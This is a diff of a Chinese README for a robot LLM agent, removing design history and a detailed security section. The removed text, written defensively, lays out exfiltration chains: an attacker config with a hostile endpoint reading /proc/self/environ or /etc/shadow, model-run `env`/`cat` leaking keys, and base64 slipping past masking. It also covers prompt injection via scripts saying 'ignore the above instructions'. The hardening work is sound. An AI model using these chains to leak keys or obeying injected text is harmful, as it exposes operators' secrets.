@@ -11,7 +11,7 @@
 > 一颗 Lua 驱动）已移除：`mybot --agent` 会被显式拒绝（退出 2）并给出指引；
 > 模型侧参数（`--task` / `--llm-*` / `--prompt-file` / `--session-file` /
 > `--resume`）是 `mybot-agent` 自己的选项（见 `mybot-agent --help`）。
-> 预算、审计、图片后注与提示词定界由两端分工实现；沿革段保留旧实现说明，
+> 预算、审计、图片后注与提示词定界由两端分工实现；设计决策与沿革存档见 [design/decisions.md](design/decisions.md)，
 > 不代表现役调用链。当前模型侧行为以 `agent/src/` 为准。
 
 ## 目录
@@ -28,7 +28,6 @@
 - [提示词包：绑定机器人身份](#提示词包绑定机器人身份)
 - [审计轨迹：--audit-log](#审计轨迹--audit-log)
 - [会话持久化：--session-file / --resume](#会话持久化--session-file----resume)
-- [远程对话（已评估，不做）](#远程对话已评估不做)
 - [策略钩子：--agent-policy](#策略钩子--agent-policy)
 - [工具后端：--mcp-backend（agent 体系的 C++ 半边）](#工具后端--mcp-backendagent-体系的-c++-半边)
 - [安全说明（请务必读）](#安全说明请务必读)
@@ -301,9 +300,6 @@ BOT4CJ_LLM_CONFIG=/etc/mybot/llm.json ./build/mybot --robot=robots/spider1.sql \
   与 C++ `kKnown` 同集合，双端同判据拒绝未知字段）；C++ 后端不消费模型侧字段
   （`mergeLlmLayer` 的有意早退）。协议差异全部属于 Rust 侧的 provider 实现。
 
-为什么是 JSON 而不是 Lua：配置文件是**数据**，不是代码。Lua 配置要由宿主内嵌状态机去执行，
-等于让一份常被复制/分发的文件获得任意代码执行能力；而仓库已有严格 JSON 解析器，复用它零成本。
-
 ## 模型调用（Rust 直连；Lua 协议驱动轨道已删）
 
 `mybot-agent`（Rust，rig 0.42）直连 provider，不经任何 Lua 驱动：
@@ -344,31 +340,6 @@ mybot-agent（Rust）     模型循环（provider.rs 直连 provider：reqwest +
 `reasoning_content` 逐轮回传、Anthropic 的 `tool_use`/`tool_result` 成对与
 `x-api-key` 头），回归由 `scripts/agent_e2e.sh` 的假模型服务守（R12/R13，
 见 [testing.md](testing.md)）。C++ 宿主对 provider 报文字段**一无所知**。
-
-### 沿革存档：为什么当初不把 HTTP 写进 C++ 宿主
-
-当初（C++ agent 时代）的决策记录，解释这条链为什么曾经存在：
-
-- 换模型/换厂商 = **换一个 Lua 文件**，宿主不重编、不链接任何 HTTP 库；
-- 项目「零第三方 C++ 依赖（仅 LuaJIT + pthread + dl）」的承诺在这条路径上依然成立；
-- 驱动生态的一切照旧适用：`build/call/destroy` 契约、`guard_build` 回滚、
-  `test/test_*.lua` 离线用例；模型驱动也能被 `.mt` 动作脚本或 `@Daemon` 调用；
-- 协议差异（如 DeepSeek 的思考模式）**只能**由驱动承担——它有状态，宿主一无所知。
-
-```
-【沿革存档：C++ --agent 时代的调用链（已全删；2026-09-25 #8 删最后一段）】
-  agentloop（C++）      工具循环（已删）
-  └─ agentproto         规范化消息/工具 ⇄ Json（传输层部分已删）
-       └─ agentdriver   ChatTransport：把请求交给驱动变量（已删）
-            └─ llm0 = modules/LlmOpenAI.lua      ← 普通硬件变量（#8 已删）
-                 └─ lib/llm_wire_openai.lua      ← 协议整形（#8 已删）
-                      └─ lib/llm_http.lua        ← ffi 直驱 libcurl（#8 已删）
-```
-
-规范化请求/响应契约、A1b 出站一致性自检、响应形变矩阵（SAN-6/PL-3/PL-6）等
-协议文档随轨道删除。它们的现役对应物在 Rust 侧：出站形状由写入不变量保证
-（`agent/src/history.rs` + SAN-12 的 id 唯一性三条来源），响应形变由 rig 的
-provider 解析承担，回归在 Rust 单测与 agent E2E（R1–R16）。
 
 ## 给智能体的工具
 
@@ -628,13 +599,7 @@ data URL 的 MIME 取自**驱动返回的 `format` 字段**（`image/jpeg`、`im
   --session-file /var/lib/mybot/s.jsonl --resume
 ```
 
-## 远程对话（已评估，不做）
-
-> **决策（2026-09-25）**：agent over TCP 远程 REPL **不做**——随 C++ agent 移除后
-> 它曾规划由 Rust agent 承担（原批次 E），本次经维护者评估正式关闭，设计存档下架
-> （历史全文见本决策提交之前的 git 历史）。远程场景回归既有路径：ssh 到机器人侧
-> 本地运行 `mybot-agent`（stdin 交互）；动作脚本的远程投递走 `--tcp` 动作源
-> （安全口径不变：回环缺省、跨机必须 `--tcp-token`）。批次字母 E 作废，不再复用。
+（远程对话已评估不做，决策存档见 [design/decisions.md](design/decisions.md)）
 
 ## 策略钩子：--agent-policy
 
@@ -792,144 +757,9 @@ M6（正确/错误/无认证帧/空密钥拒启）、`agent_e2e.sh` R17（两进
 
 ## 安全说明（请务必读）
 
-1. **`run_command` 是无命令白名单的任意 shell 执行，但后端强制要求 policy 确认**。
-   它缺省不注册，只能由后端命令行 `--agent-shell` 授权；配置文件不能自行开启。
-   同时必须提供 `--agent-policy`（或后端配置的 `agent_policy`），且 `require_confirm`
-   包含 `run_command`；`--agent-hot-sql` 同理必须覆盖 `apply_sql`，否则上电前拒绝启动。
-   模型仍可能被外部输入诱导执行任意命令；确认程序须可信，超时缺省拒绝（可显式改为放行）。
-   policy 不是隔离边界：需要对外暴露时仍须专用用户 / 容器 / 网络命名空间。
-2. **后端保留两道环境防线**（2026-09-20 审计 A 收口）：
-   ① `run_command` 的子进程环境按**整词**清洗——名称含 `key` / `token` / `secret` / `password` /
-   `passwd` / `credential` 的变量不传给子进程（`BOT4CJ_LLM_KEY` 天然落在内，`KEYSTONE`/`MONKEY` 不误伤）；
-   ② C++ 后端抹掉自己 exec 时环境块中的敏感串；旧 C++ agent 曾先注入模型密钥再抹零。
-   **这些防线不覆盖独立 Rust 进程的环境**——Rust 进程的内存与 `/proc/<pid>/environ` 由第 3 条的
-   `PR_SET_DUMPABLE=0` 挡住同 uid 读取，但仍不能推断同 uid 的 shell 拿不到密钥（落盘来源见下）。
-   **落盘来源仍是明文可读**：密钥若来自配置文件（`api_key` 字段）或密钥文件（`api_key_file`），
-   同用户 shell 可直接读出，`chmod 600` 对此无效。后端不解析模型密钥来源，不能再依赖旧
-   C++ agent 的「启用 shell 且密钥来自文件」启动告警。
-   **③ 回执的第三道防线（2026-09-23 审计 G1）**：子进程环境清洗挡不住「命令自己把密钥打印到
-   stdout/stderr」——模型让命令执行 `env`、`cat` 配置文件、或任何打印 `KEY=value` 的输出，都会经
-   回执带回模型上下文，再由同一配置可控的 `endpoint` 外发。因此 `run_command` 的**回执文本**在回传
-   模型**之前**也会过一次敏感值遮蔽（与审计日志的 `args.command` 是同一个 `maskSecretsInText` 单点：
-   `KEY=VALUE` / `Authorization: Bearer <tok>` / 裸 `Bearer <tok>` 三种形态）。遮蔽是**有损**的：
-   一旦发生替换，回执末尾会追加一句「已净化」提示，让模型知道结果被改过、不要据此假定原值。
-   注意这仍是**文本级**防线（把值 base64/编码后打印即可绕过），与上面两道同档——真要对抗恶意 shell，
-   仍须把 agent 放进专用用户 / 容器（见本节第 3 条末）。
+危险能力（`run_command` 任意 shell、`apply_sql` 带电变更、可读变量清单）**缺省全关**，须由后端命令行 `--agent-shell` / `--agent-hot-sql` / `--read-var` 显式开启，且必须配合 `--agent-policy` 确认程序。密钥只走环境变量或配置文件，不经 argv。配置错误（含未知字段、区间越界、权限放宽）一律退出 2，不碰真机。
 
-3. **模型 API key 由 Rust 直接读取**：`agent/src/config.rs` 从环境变量或配置文件
-   （`api_key`/`api_key_file`）取密钥，`provider.rs` 用于请求头；不经后端工具参数、Lua 驱动或
-   `BOT4CJ_DEBUG` 转储，两端均无命令行传密钥的入口。
-   - 环境变量链：`BOT4CJ_LLM_KEY` → `ROBOT_AGENT_API_KEY` → `DEEPSEEK_API_KEY`，再回退到 Rust 配置文件的 `api_key` / `api_key_file`。
-   - **两进程都不可 dump**（2026-09-25）：`mybot` 与 `mybot-agent` 进入 `main` 的第一件事是
-     `prctl(PR_SET_DUMPABLE, 0)`——在解析 argv、读配置之前。效果：同 UID 的其他进程不能
-     `ptrace` 附着（gdb/strace attach 得到 EPERM），`/proc/<pid>/environ`、`mem`、`maps` 等
-     变为 root 属主不可读，崩溃不落 core。边界如实：**root / `CAP_SYS_PTRACE` 不受影响**，
-     `/proc/<pid>/cmdline` 仍全机可读（所以 `--tcp-token` 仍推荐走环境变量），密钥的**落盘
-     来源**（配置文件 / 密钥文件）与本步无关。调试需要 attach 时设 `BOT4CJ_ALLOW_PTRACE=1`
-     （两进程各打一行「注意」）；sanitizer 构建编译期跳过（LeakSanitizer 需 ptrace 自身）。
-   - **同 UID 仍不构成隔离**：上面这一步挡的是「读运行中进程的内存」这一条路；同 UID 的 shell
-     仍能读密钥文件、改配置、替换驱动 `.lua`、以相同环境重新拉起 agent。想同时挡住其他本机用户
-     与 agent 自己的 shell，得把 agent 放进**专用用户 / 容器 / 网络命名空间**。
-   - 落盘的密钥请 `chmod 600`，启动时对「同组/其他用户可读」会打印提醒，仓库 `.gitignore` 已挡住 `mybot.llm.json` 一类文件名
-   - 曾有的 `--llm-key` 已移除：它必然出现在 `/proc/<pid>/cmdline`（本机所有用户可读）
-4. **动作脚本路径是沙箱边界**：`run_action_script` 只接受 `--scripts-dir` 下的 `.mt` 相对路径。这是防误用护栏，
-   不是对抗恶意模型的边界——真正的边界仍然是「模型输出即不可信输入」这条工程常识。
-5. **仪表器件不会被工具误触发**：`list_hardware` 不读值（对舵机等执行器，`play({})` 会真的下发指令）。
-   `capture_image` 同样有种类防线：`camera_var` 必须解析到一个 **Lua 驱动**，否则该工具直接不注册并打印提示——
-   `playQuiet` 对别的种类就退化成 `play()`，那样模型调一次「拍照」就会往别名/数值变量/舵机上真下发 `{path,src}`。
-6. **模型调用由 Rust agent 进程出网，不经 Lua 驱动**：`mybot-agent`（reqwest + rustls）直连
-   配置的接入点；C++ 宿主与 Lua 驱动沙箱都不参与网络（2026-09-25 #8 起 Lua 协议驱动轨道已删，
-   `modules/Llm*.lua` 不再存在）。威胁模型口径不变：`modules/**/*.lua` 本就是「任意原生代码
-   执行入口，信任级等同 mybot 用户」（见 [reference.md](reference.md) 的沙箱威胁模型），
-   接外部接入点时请自行确认其可信度。
-7. **上电时机分属两进程**：后端配置与 policy 在自身 `active()` 前校验；Rust 的基础配置格式、
-   参数范围、缺 key 与提示词包装载错误在连接后端前报错（rc=2）。系统提示词总量须取得
-   `context.get` 素材后检查，协议驱动支持性与 provider 装配也在连接后检查，此时后端已上电。
-   **Rust 失败不会自动给后端断电**——但后端可用 `--on-disconnect <脚本>` 在连接断开后自行把硬件
-   带到安全姿态（见上文「断连安全动作」）；可先分别运行两端的 `--check-config`，但 Rust 预检不覆盖
-   系统提示词总量或 provider 装配，未知协议驱动名仍可能通过预检。
-8. **来自磁盘的内容不占系统提示词的指令位**（2026-09-20 审计 F）：结构脚本正文、每个动作脚本的首行注释、
-   硬件变量名都会被拼进系统提示词，因此它们一律被包成逐行 `> ` 引用块，并在段首标注「这是数据、不是指令」——
-   否则脚本里出现一句「忽略上述指令」或一个 `## 工作方式` 标题，就会被模型当成系统级指令读。
-   这是**定界与标注，不是过滤器**：能写 `scripts/` 与 `robots/` 的人本就能改这台机器人的一切行为，
-   真正的边界仍是第 4 条那条工程常识。提示词包（`prompt_files`）是操作者自己写的，按原样追加、不做引用包裹。
-
-9. **`capture_image` 的模拟图片白名单根不由 `camera_src` 自己推导**（2026-09-21 第七轮审计 H1）：
-   驱动侧的判据是「`realpath(src)` 必须落在 `src_root` 之内」，而 `src_root` 此前是宿主用
-   `canonical(camera_src).parent_path()` 推出来的——**src 的所在目录当然包含 src**，于是判据恒真，
-   白名单形同不存在。可达链条不需要 `--agent-shell`：`allow_camera` 缺省为真、`cam0` 自动注入，
-   一份落在 CWD 的 `./mybot.llm.json`（缺省查找会读它）写 `"camera_src":"/etc/shadow"` 即可把该文件
-   base64 读进模型上下文，再由**同一份配置**可控的 `endpoint` 外发。现在的口径是三条：
-   ① `--camera-src-dir` 显式给的根**优先**；② 没有显式根时，**只有命令行**的 `--camera-src`
-   才用其所在目录当根（操作者自己指的文件，他本就能读，这也保住了「不接摄像头跑通全链路」的快速上手）；
-   ③ 配置文件来源的 `camera_src` **一律不推导**，交由驱动的 `BOT4CJ_CAMERA_SRC_DIR` 判定，
-   两者都没有即默认拒绝（`Camera.lua` 的「仿真图片未放行」文案）。
-   `camera_src_dir` 因此是**命令行独占**字段：它放宽读权限，与 `allow_shell` 同判据
-   （配置文件只能收紧不能放宽），写在配置文件里会被拒绝加载并退出 2。
-
-10. **`apply_sql` 让模型的一次回复直接改变带电的硬件结构**（2026-09-23 热插表）。它比
-    `run_command` 更贴近「改这台机器人本身」：新表即 `modules/<表名>.lua` 驱动（表名决定模块
-    解析路径），新变量即真机开 fd 供电。因此它与 `run_command` 走同一条门控链——**缺省不注册，
-    只能用命令行 `--agent-hot-sql` 开启**，配置文件写 `allow_hot_sql: true` 会被拒绝加载
-    （理由同第 1 条：缺省查找会读 CWD 的 `./mybot.llm.json`）。
-    热插路径另有三道自有判据（不依赖操作者自律）：表名与列名必须通过安全标识符校验（挡
-    `../` 目录穿越与 `@Daemon` 配置串注入）、驱动模块必须已存在于模块路径下、守护行的 `chunk`
-    必须是模块路径下的相对路径。这些校验**全部只读**，通过后才提交；提交中任一步失败即整批
-    回滚（逆序断电 + 注册表回退到批次前的水位），不让系统停在「一半器件已上电」的半成品状态。
-    只读的 `query_sql` 不受这条门控影响。
-
-    同一门控下还有**热删除**（`DELETE FROM ... [WHERE ...]`）与**整表撤下**（`DROP TABLE ...`，
-    均 2026-09-23），但危险性质不同：
-    热插/INSERT 是可回滚的加法，而 `DELETE` 走 `destroy()` —— **物理断电，没有回滚**
-    （回滚 ≠ 复活器件）。因此它的防线不靠「事后撤销」而靠「**事前判全**」：
-    - 全部校验（目标表存在、行能命中、**引用完整性**、全结构判据）都在**动第一个器件之前**
-      跑完，任一失败即整批拒绝、活体一字未动；过了这道关，剩下的失败只可能来自物理
-      `destroy` 本身。
-    - 引用完整性是新增的关键判据：被别的行以 `controller`/`trigger`（含 `controller2` 这类
-      编号列）、`$name` 或 `$(...)` 表达式引用着的变量**拒绝删除**并点名引用方。理由不是保守，
-      而是这些引用在框架内部是**终身缓存的裸指针**（`MtVars_Lua::ctrlPtrs_`/`trigPtrs_`
-      首用缓存、`MetaRef::target` 在装配期锁定），删掉被引用者即悬垂指针——静默 UB 换不来
-      任何好处。判据看的是**删除之后**的视图，故「引用方一起删」是允许的。
-    - 物理 `destroy` 中途失败时**立即中止**后续删除并如实报出「已删 N 个（名单）、M 个未删」，
-      结构与注册表只反映已成功摘除的部分——不假装回滚，也不继续硬闯叠加失败。
-    - 条件命不中任何行时**报错**而不是静默成功：模型/操作者拿到「已生效」却什么都没发生时，
-      无从判断是条件写错还是器件本就不在（拼错 name 的 DELETE 会让人以为器件已摘除）。
-    - 删除后 `flowRefs_` 里的名字一并摘除，故「删掉再热插同名变量」是一条合法恢复路径。
-
-11. **配置文件里的 `prompt_files` 不是「读任意文件」的原语**（H2，2026-09-23 第八轮审计）。
-    提示词包的内容会进系统提示词、随**首个**模型请求发往 endpoint，而 endpoint 同样由
-    配置文件决定；读取又走 `read()` 循环（`util::readFileCapped`，不依赖 `stat` 长度），
-    因此 **`/proc/self/environ` 这类伪文件照样读得到**。合起来是一条不需要任何开关的链路：
-    一份落在 CWD 的 `./mybot.llm.json`（缺省查找会读它）写
-    `{"endpoint":"<攻击者>","prompt_files":["/proc/self/environ"]}`，就能把操作者的环境块
-    （其中就有宿主重新注入的 `BOT4CJ_LLM_KEY`）整块外发——不需要 `--agent-shell`，也不
-    需要摄像头。这与第 9 条的 `camera_src` 是**同一族**（「配置文件不该授予读权限」），
-    故同判据：
-    ① **命令行** `--prompt-file` 不受限（操作者自己指的文件，他本就能读，也保住了
-    `--prompt-file prompts/spider_robot/` 的快速上手路径）；② **配置文件来源**的每一项
-    必须落在当前工作目录，或 `BOT4CJ_PROMPT_DIR`（冒号分隔）显式列出的目录之内，判定走
-    `realpath`（`..` 与软链逃逸都拦），越界即在上电前报错退出 2 并点名条目、允许的根与
-    两个出路；③ 环境变量只能由启动者设置，配置文件写不了它——与第 9 条的
-    `BOT4CJ_CAMERA_SRC_DIR` 是同一个逃生口。
-    残余如实声明：这条判据管的是**路径来源**，不是内容——CWD 之内的文件（包括攻击者自己
-    放进去的）仍会被原样追加进系统提示词，这属第 8 条已声明的「提示词包按操作者写的原样
-    追加」；真正的边界仍是「不要在不信任的目录里启动 mybot」。
-
-12. **`read_variables` 的可读集合只能由操作者显式列名**（2026-09-23 回读通道）。工具本身
-    是只读的（走 `playQuiet`，对 `daemon` 只是读已发布的采样快照，无 I2C 流量），但
-    **「能读哪些变量」无法靠种类自动判定**：`Servo.lua` / `Relay.lua` 与传感器同属
-    `kind=lua`，对它们调 `play()` 会**真驱动硬件**（`Relay` 的 `call({})` 会把 delay 转发给
-    controller）。因此口径是：
-    ① 可读集合由命令行 `--read-var <名>`（可重复）声明，**缺省不提供该工具**；
-    ② 配置文件写 `read_vars` 会被**拒绝加载并退出 2**（配置只能收紧不能放宽，与
-    `allow_shell` / `camera_src_dir` 同判据，理由同第 1 条：缺省查找会读 CWD 的
-    `./mybot.llm.json`）；
-    ③ 声明里已注册且种类为 `lua`/`daemon` 的名字才生效，其余**跳过并点名**（启动时打一行
-    `提示: …被跳过…`）——不因一个拼错的名字让整条能力静默失效，也绝不放行"种类不对"的
-    变量（`playQuiet` 对别的种类退化成 `play()`，与第 5 条 `capture_image` 的种类防线同一
-    理由）；一个都不可读时该工具不注册。
-    边界如实声明：**读传感器也可能有副作用**——部分器件的 `call` 会先写触发寄存器再读，
-    所以这是一次**派发**（照走任务预算与审计），不是"绝对不改状态"的承诺。
+完整安全设计论证（含攻击场景、防线推导与历史审计记录）见 [design/security-rationale.md](design/security-rationale.md)。
 
 ## 源码分层
 
